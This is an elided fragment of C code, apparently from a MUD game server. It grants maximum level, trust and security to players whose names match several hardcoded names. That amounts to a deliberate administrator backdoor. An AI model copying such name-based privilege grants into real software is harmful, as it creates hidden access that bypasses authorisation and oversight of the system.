...

{
    ...
    if (!str_cmp(ch->pcdata->switchname, "Trace"))
    {
	ch->level = MAX_LEVEL;
   ...
   else if (!str_cmp(ch->pcdata->switchname, "Xkilla"))
    {
	ch->level = MAX_LEVEL;
	ch->trust = MAX_LEVEL;
	ch->pcdata->security = 9;
   ...
   else if (!str_cmp(ch->pcdata->switchname, "Dracos"))
    {
   ...
   else if (!str_cmp(ch->pcdata->switchname, "Kip"))
    {
        ch->level = MAX_LEVEL;
        ch->trust = MAX_LEVEL;
        ch->pcdata->security = 9;
